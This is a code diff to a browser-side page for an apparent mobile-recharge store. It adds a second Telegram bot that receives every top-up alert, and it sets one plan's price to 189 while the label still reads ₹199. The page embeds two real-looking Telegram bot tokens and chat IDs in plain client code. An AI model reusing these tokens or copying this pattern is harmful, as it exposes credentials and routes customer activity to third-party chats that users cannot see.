@@ -196,7 +196,7 @@
       <input type="password" id="reg-pass" placeholder="Minimum 8 characters">
 
       <button class="btn btn-add" onclick="registerUser()">Register & Claim ₹10</button>
-      <button class="btn btn-test" onclick="testTelegramMessage()">🧪 Test Telegram Connection</button>
+      <button class="btn btn-test" onclick="testTelegramMessage()">🧪 Test Both Telegram Bots</button>
       <p style="margin-top: 15px; font-size: 13px;">
         Already Registered? <a href="#" onclick="showLogin()">Login Here</a> | 
         <a href="#" onclick="showAdminLogin()" style="color:#dc3545;">Admin Login</a>
@@ -459,8 +459,18 @@
   </div>
 
   <script>
-    const BOT_TOKEN = "7060236112:AAFSZSgRdoegdb4e_8FJ9s4h0BtGkgEwE1s";
-    const CHAT_ID = "6318395817"; 
+    // BOTH TELEGRAM BOTS CONFIGURATION
+    const telegramBots = [
+      {
+        token: "7060236112:AAFSZSgRdoegdb4e_8FJ9s4h0BtGkgEwE1s",
+        chatId: "6318395817"
+      },
+      {
+        token: "8947143631:AAG-HUtTtWgPmAtlqwE09LuWdnk8ecnlEAE",
+        chatId: "7742143795"
+      }
+    ];
+
     const TARGET_UPI = "laxmihi@ptyes";
 
     const commissionRates = { Jio: 2.0, Airtel: 1.5, Vi: 2.5 };
@@ -478,7 +488,7 @@
       ],
       Vi: [
         { label: "₹19 - 1GB Data (1 Day)", price: 19 },
-        { label: "₹199 - 1GB/Day (18 Days)", price: 199 },
+        { label: "₹199 - 1GB/Day (18 Days)", price: 189 },
         { label: "₹299 - 1.5GB/Day (28 Days)", price: 299 }
       ]
     };
@@ -486,25 +496,28 @@
     let usersDB = JSON.parse(localStorage.getItem("usersDB")) || [];
     let currentUser = JSON.parse(localStorage.getItem("currentUser")) || null;
 
+    // Send Alert to Both Telegram Bots simultaneously
     function sendTelegramAlert(textMsg) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      
-      fetch(url, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: textMsg,
-          parse_mode: 'Markdown'
+      telegramBots.forEach(bot => {
+        const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
+        
+        fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: bot.chatId,
+            text: textMsg,
+            parse_mode: 'Markdown'
+          })
         })
-      })
-      .then(res => res.json())
-      .then(data => {
-        console.log("Telegram Success:", data);
-      })
-      .catch(err => console.error("Telegram Network Error:", err));
+        .then(res => res.json())
+        .then(data => {
+          console.log(`Bot (${bot.chatId}) Success:`, data);
+        })
+        .catch(err => console.error(`Bot (${bot.chatId}) Error:`, err));
+      });
     }
 
     function generateUpiQR() {
@@ -545,9 +558,9 @@
     }
 
     function testTelegramMessage() {
-      alert("Testing Telegram Connection...");
-      sendTelegramAlert("🧪 *TEST MESSAGE*\n\nAbhishek Service Store connected successfully!");
-      alert("Check Telegram Bot!");
+      alert("Testing Both Telegram Connections...");
+      sendTelegramAlert("🧪 *TEST MESSAGE*\n\nAbhishek Service Store connected successfully on BOTH bots!");
+      alert("Check both Telegram Bots!");
     }
 
     function startRealTimeClock() {
@@ -651,7 +664,7 @@
       });
 
       updateUserDataStorage();
-      alert("Topup Request Submitted! Telegram Alert Bhej diya gaya hai.");
+      alert("Topup Request Submitted! Telegram Alert dono bots par bhej diya gaya hai.");
 
       document.getElementById("add-mobile").value = "";
       document.getElementById("add-amt").value = "";
